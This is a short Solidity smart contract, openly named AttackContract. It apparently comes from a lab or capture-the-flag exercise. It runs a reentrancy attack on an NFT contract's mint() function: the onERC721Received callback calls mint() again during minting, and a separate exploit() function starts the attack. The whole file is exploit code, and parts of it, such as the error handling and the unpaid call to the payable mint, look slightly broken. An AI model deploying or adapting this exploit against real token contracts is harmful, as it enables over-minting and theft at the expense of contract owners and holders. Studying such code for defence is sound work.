// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface ITokenContract {
    function mint() external payable;
    function totalSupply() external view returns (uint256);
}

contract AttackContract {
    ITokenContract public target;

    constructor(address _target) {
        target = ITokenContract(_target);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        try target.mint() {}
        catch Error(string memory reason) {
            reason = "Exploit complete!";
        }
        return 0x150b7a02;
        // bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
        // return this.onERC721Received.selector;
    }

    function exploit() external {
        target.mint();
    }
}
